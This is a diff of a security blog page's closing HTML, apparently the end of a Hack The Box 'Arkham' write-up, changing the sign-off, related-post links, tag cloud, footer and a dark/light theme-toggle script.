-<h4 id="previous-hack-the-box-write-up--hack-the-box---fortune">Previous Hack The Box write-up : <a href="/hack-the-box/fortune/">Hack The Box - Fortune</a></h4>
-<h4 id="next-hack-the-box-write-up--hack-the-box---helpline">Next Hack The Box write-up : <a href="/hack-the-box/helpline/">Hack The Box - Helpline</a></h4>
+<p><br /> And yes that worked :
+<img src="/images/hackthebox/arkham/15.png" alt="" />
+<br /> We owned root !
+<br /> That’s it , Feedback is appreciated !
+<br /> Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham">@Ahm3d_H3sham</a>
+<br /> Thanks for reading.
+<br />
+<br />
+<br /> Previous Hack The Box write-up : <a href="/hack-the-box/fortune/">Hack The Box - Fortune</a>
+<br /> Next Hack The Box write-up : <a href="/hack-the-box/helpline/">Hack The Box - Helpline</a></p>
 <hr />
 
 
-  </div>
-<script src="https://www.hackthebox.eu/badge/65598"></script><a class="u-url" href="/hack-the-box/arkham/" hidden></a>
-</article>
-
-      </div>
-    </main><footer class="site-footer h-card">
-  <data class="u-url" href="/"></data>
-
-  <div class="wrapper">
-
-    <h2 class="footer-heading">0xRick Owned Root !</h2>
-
-    <div class="footer-col-wrapper">
-      <div class="footer-col footer-col-1">
-        <ul class="contact-list">
-          <li class="p-name">0xRick Owned Root !</li></ul>
-      </div>
-
-      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://www.facebook.com/Ahm3d.H3sham"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#facebook"></use></svg> <span class="username">Ahm3d.H3sham</span></a></li><li><a href="https://github.com/0xRick"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">0xRick</span></a></li><li><a href="https://www.twitter.com/Ahm3d_H3sham"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">Ahm3d_H3sham</span></a></li></ul>
 </div>
 
-      <div class="footer-col footer-col-3">
-        <p>Infosec Blog , CTF and Hack The Box write-ups , articles and other stuff</p>
+
+
+
+
+<div class="related">
+  <h2>other posts</h2>
+  <ul class="related-posts">
+    
+      <li>
+        <h3>
+          <a href="/pwn/collision/">
+            pwnable.kr - collision
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/hack-the-box/unattended/">
+            Hack The Box - Unattended
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/hack-the-box/helpline/">
+            Hack The Box - Helpline
+          </a>
+        </h3>
+      </li>
+    
+  </ul>
+</div>
+
+
+
+
+  
+  <h2>all tags</h2>
+  <div class="tag-cloud"><a href="/tag/active-directory/" class="set-1">active-directory</a> <a href="/tag/binary-exploitation/" class="set-3">binary-exploitation</a> <a href="/tag/bsd/" class="set-1">bsd</a> <a href="/tag/buffer-overflow/" class="set-2">buffer-overflow</a> <a href="/tag/c/" class="set-2">c</a> <a href="/tag/code-analysis/" class="set-1">code-analysis</a> <a href="/tag/cryptography/" class="set-1">cryptography</a> <a href="/tag/drupal/" class="set-1">drupal</a> <a href="/tag/egghunting/" class="set-1">egghunting</a> <a href="/tag/exploit-development/" class="set-1">exploit development</a> <a href="/tag/exploit-development/" class="set-2">exploit-development</a> <a href="/tag/firewall/" class="set-1">firewall</a> <a href="/tag/forensics/" class="set-1">forensics</a> <a href="/tag/ftp/" class="set-1">ftp</a> <a href="/tag/joomla/" class="set-1">joomla</a> <a href="/tag/latex-injection/" class="set-1">latex-injection</a> <a href="/tag/ldap/" class="set-1">ldap</a> <a href="/tag/lfi/" class="set-1">lfi</a> <a href="/tag/linux/" class="set-5">linux</a> <a href="/tag/networking/" class="set-2">networking</a> <a href="/tag/php/" class="set-2">php</a> <a href="/tag/pivoting/" class="set-1">pivoting</a> <a href="/tag/python/" class="set-3">python</a> <a href="/tag/rbash/" class="set-1">rbash</a> <a href="/tag/rce/" class="set-5">rce</a> <a href="/tag/reverse-engineering/" class="set-1">reverse-engineering</a> <a href="/tag/smb/" class="set-2">smb</a> <a href="/tag/snmp/" class="set-1">snmp</a> <a href="/tag/sqli/" class="set-1">sqli</a> <a href="/tag/ssh/" class="set-3">ssh</a> <a href="/tag/ssti/" class="set-1">ssti</a> <a href="/tag/steganography/" class="set-1">steganography</a> <a href="/tag/web/" class="set-5">web</a> <a href="/tag/windows/" class="set-3">windows</a> <a href="/tag/windows-exploitation/" class="set-1">windows-exploitation</a> <a href="/tag/wordpress/" class="set-1">wordpress</a></div>
+  
+
+
+
       </div>
-    </div>
+    </main><footer class="site-footer">
+	<center> <script src="https://www.hackthebox.eu/badge/65598"></script> </center>
+  <div class="wrapper"><div class="toggleWrapper">
+    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
+    <label for="theme-toggle" class="toggle">
+    <span class="toggle__handler">
+      <span class="crater crater--1"></span>
+      <span class="crater crater--2"></span>
+      <span class="crater crater--3"></span>
+    </span>
+        <span class="star star--1"></span>
+        <span class="star star--2"></span>
+        <span class="star star--3"></span>
+        <span class="star star--4"></span>
+        <span class="star star--5"></span>
+        <span class="star star--6"></span>
+    </label>
+</div>
+<script type="text/javascript">
+const theme = localStorage.getItem('theme');
+if (theme === "dark") {
+	document.documentElement.setAttribute('data-theme', 'dark');
+}
+const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');
 
+if (theme === "dark") {
+    document.getElementById('theme-toggle').checked = true;
+    document.documentElement.setAttribute('data-theme', 'dark');
+    document.documentElement.classList.add('theme--dark');
+    document.documentElement.classList.remove('theme--light');
+	document.getElementById("theme-toggle").className = 'light';
+} else if (theme === "light") {
+    document.getElementById('theme-toggle').checked = false;
+    document.documentElement.setAttribute('data-theme', 'light');
+    document.documentElement.classList.add('theme--light');
+    document.documentElement.classList.remove('theme--dark');
+	document.getElementById("theme-toggle").className = 'dark';
+} else if  (userPrefers === "dark") {
+    document.getElementById('theme-toggle').checked = false;
+    document.documentElement.setAttribute('data-theme', 'dark');
+	document.documentElement.classList.add('theme--dark');
+    document.documentElement.classList.remove('theme--light');
+	window.localStorage.setItem('theme', 'dark');
+	document.getElementById("theme-toggle").className = 'light';
+} else {
+    document.getElementById('theme-toggle').checked = true;
+    document.documentElement.setAttribute('data-theme', 'light');
+	document.documentElement.classList.add('theme--light');
+    document.documentElement.classList.remove('theme--dark');
+	window.localStorage.setItem('theme', 'light');
+	document.getElementById("theme-toggle").className = 'dark';
+}
+
+function modeSwitcher() {
+	let currentMode = document.documentElement.getAttribute('data-theme');
+	if (currentMode === "dark") {
+	    document.documentElement.setAttribute('data-theme', 'light');
+		document.documentElement.classList.add('theme--light');
+        document.documentElement.classList.remove('theme--dark');
+		window.localStorage.setItem('theme', 'light');
+	    document.getElementById("theme-toggle").className = 'dark';
+	} else {
+	    document.documentElement.setAttribute('data-theme', 'dark');
+		document.documentElement.classList.add('theme--dark');
+        document.documentElement.classList.remove('theme--light');
+		window.localStorage.setItem('theme', 'dark');
+	    document.getElementById("theme-toggle").className = 'light';
+	}
+}
+</script></div>
   </div>
-
 </footer>
-</body>
+
+
+<script>
+      window.FontAwesomeConfig = {
+        searchPseudoElements: true
+      }
+    </script>
+  </body>
 
 </html>
-
